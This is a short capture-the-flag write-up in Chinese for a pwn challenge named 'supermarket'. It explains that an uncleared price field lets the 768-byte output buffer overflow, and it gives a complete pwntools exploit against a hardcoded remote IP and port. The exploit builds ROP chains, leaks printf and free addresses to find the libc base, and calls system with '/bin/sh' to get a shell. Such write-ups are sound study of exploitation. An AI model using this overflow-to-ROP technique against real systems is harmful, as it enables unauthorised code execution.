# pwn
## supermarket
- 第一个点是add a commodity函数中当price为0的时候，原有price不会被清空，利用这一点可以先申请一个很大的description空间，然后便可以控制接下来申请的内存中的price的内容。
- 第二个点是show list函数中的s[768]数组作为输出缓冲区存在溢出（因为第一点中的price可以任意控制），便可以覆盖返回地址，适当控制长度便可以覆盖返回地址，因为首先会覆盖输出商品循环的i，所以在覆盖返回地址的前一刻把i覆盖成-1，便可以写入存在第一个商品信息中的rop，getshell
- exp

```
#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
from pwn import *
ip = '117.78.40.45'
port = 32755
MODE = 1
VERBOSE = 1
printf_offset = 0x00049020
system_offset = 0x0003A940
binsh_offset = 0x0015902B

def add_function(p, name, price, descrip_size, descrip):
    p.recvuntil('your choice>> ')
    p.sendline('1')
    p.recvuntil('name:')
    p.send(name)
    p.recvuntil('price:')
    p.sendline(str(price))
    p.recvuntil('descrip_size:')
    p.sendline(str(descrip_size))
    p.recvuntil('description:')
    p.send(descrip)

def delete_function(p, name):
    p.recvuntil('your choice>> ')
    p.sendline('2')
    p.recvuntil('name:')
    p.send(name)

def show_list(p):
    p.recvuntil('your choice>> ')
    p.sendline('3')

def crack(ip='', port=0):
    if VERBOSE:
        context.log_level = 'debug'

    if MODE == 0:
        if DEBUG:
            p = gdb.debug((p_NAME, ), gdbscript=gdbscript, env=env)
            raw_input('')
        else:
            p = process((p_NAME, ), env=env)
            sol = ''
    else:
        p = remote(ip, port)

    add_function(p, 's'*15, 999, 0x100, 'b'*0xff)
    delete_function(p, 's'*15 + '\n')
	
    payload = 'ab' + p32(0x8048812) + p32(0x08048602) + p32(0x804b504+1) + 'cd'
    add_function(p, 's'*15 , 0, 0x11, payload)
    add_function(p, 'b'*15, 0, 0x11, 'b'*16)
    add_function(p, 'c'*15, 0, 0x11, 'c'*16)

    for i in range(3, 15):
        add_function(p, chr(ord('a')+i)*15, 999, 0x11, chr(ord('a')+i+1)*16)
    add_function(p, 'r'*15, 999, 0x11, '\xff'*16)
    show_list(p)

    payload = 'a'*12
    payload += p32(0x08048570) + p32(0x080484d9) + p32(0x0804B014)
    payload += p32(0x8048812) + p32(0x08048cdd) + p32(0x804b504+1+12 + 4*3 + 4*3 + 4) + p32(100)
    p.sendline(payload)

    add_function(p, 'a'*15, 999, 0x100, 'b'*0xff)
    delete_function(p, 'a'*15 + '\n')
    payload = 'abcdefg'.ljust(16, 'a')
    payload = p32(0x804b504+1 + 12 - 4) + p32(0x08048668) + 'a'*8
    add_function(p, 'a'*13 + '\n', 0, 0x11, payload)
    add_function(p, 'c'*15, 0, 0x11, 'd'*16)
    add_function(p, 'd'*15, 0, 0x11, 'e'*16)

    for i in range(3, 15):
        add_function(p, chr(ord('b')+i)*15, 999, 0x11, chr(ord('b')+i)*16)
    add_function(p, 'w'*15, 999, 0x11, '\xff'*16)
    show_list(p)

    p.recvuntil('\n\n')
    printf_addr = u32(p.recv(4))
    free_addr = u32(p.recv(4))
    log.info('printf_addr=0x%x' % printf_addr)
    log.info('free_addr=0x%x' % free_addr)

    libc_base = printf_addr - printf_offset
    payload = p32(system_offset + libc_base) + p32(0) + p32(binsh_offset + libc_base)
    p.sendline(payload)

    return p

def main():
    p = crack(ip,port)
    p.interactive()

if __name__ == '__main__':
    main()

```